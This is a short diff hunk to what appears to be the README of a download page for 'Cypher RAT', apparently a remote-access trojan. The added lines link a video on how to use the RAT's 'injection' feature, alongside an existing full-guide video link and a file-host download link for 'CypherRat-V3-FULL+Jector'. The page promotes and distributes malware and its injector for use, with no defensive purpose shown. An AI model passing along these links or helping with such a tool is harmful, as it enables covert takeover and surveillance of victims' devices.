@@ -84,6 +84,8 @@ Images :
 
 [HOW TO USE CYPHER RAT FULL GUIDE](https://vimeo.com/697563764)
 
+[HOW TO USE CYPHER RAT INJECTION](https://www.youtube.com/watch?v=zJWEboPMXzw)
+
 --------------
 
 [DOWNLOAD](https://www.mediafire.com/file/q6md47lskb6d2uk/CypherRat-V3-FULL+Jector.rar/file)
